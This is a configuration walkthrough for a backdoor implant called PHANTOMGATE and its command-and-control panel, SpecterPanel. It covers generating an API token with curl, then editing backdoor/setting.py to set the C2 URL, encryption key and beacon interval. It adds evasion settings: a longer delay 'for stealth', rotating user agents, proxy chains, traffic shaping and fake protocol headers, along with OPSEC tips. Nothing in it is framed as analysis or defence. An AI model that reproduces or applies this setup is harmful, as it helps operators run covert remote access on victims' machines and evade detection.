STEP 1 :: TOKEN ACQUISITION

Log into SpecterPanel and navigate to Settings → API Token. Generate a fresh token.

$ curl -X POST https://your-panel.com/api/token/generate \ -H "Authorization: Bearer <master_key>" # Response: sp_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZ2VudF9tYW5hZ2VyIn0.3fZ9mE2pQ4R7tY1uI8oP0

⚠️ OPSEC Store token in environment variables. Rotate every 72h.

STEP 2 :: CONFIGURE PHANTOMGATE

Edit setting.py (inside the backdoor/ folder). The file contains a class Setting with method setting_var() that initializes all settings. Below are the critical parameters, prioritized by importance.

█ HIGH PRIORITY (must change)
  • self.API_TOKEN – Paste your token from Step 1.
  • self.url – Your SpecterPanel C2 URL (e.g., https://c2.domain.com).
self.API_TOKEN = "sp_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." self.url = "https://your-panel.com"
█ MEDIUM PRIORITY (recommended)
  • self.ENCRYPTION_KEY – Generate a new 16-byte key: os.urandom(16).
  • self.MAIN_LOOP_DELAY – Beacon interval (default 15 sec). Increase to 30–60 for stealth.
  • self.USER_AGENTS – Rotate realistic browser user agents.
  • self.PROXIES – Route traffic through proxy chain (optional).
self.ENCRYPTION_KEY = b'\x...' # new 16 bytes self.MAIN_LOOP_DELAY = 45 self.USER_AGENTS = ["Mozilla/5.0 ...", ...] self.PROXIES = ['http://proxy:8080']
█ LOW PRIORITY (optional tuning)
  • self.PORT – Port scan list.
  • self.BASE_DELAY, self.MAX_DELAY, self.MIN_DELAY – Network timing.
  • self.ADAPTIVE_THRESHOLD – Traffic shaping.
  • self.FAKE_HEADERS – Binary headers for protocol mimicry.

Default values work for most scenarios; adjust only if you understand the impact.

$ nano backdoor/setting.py    # save and exit
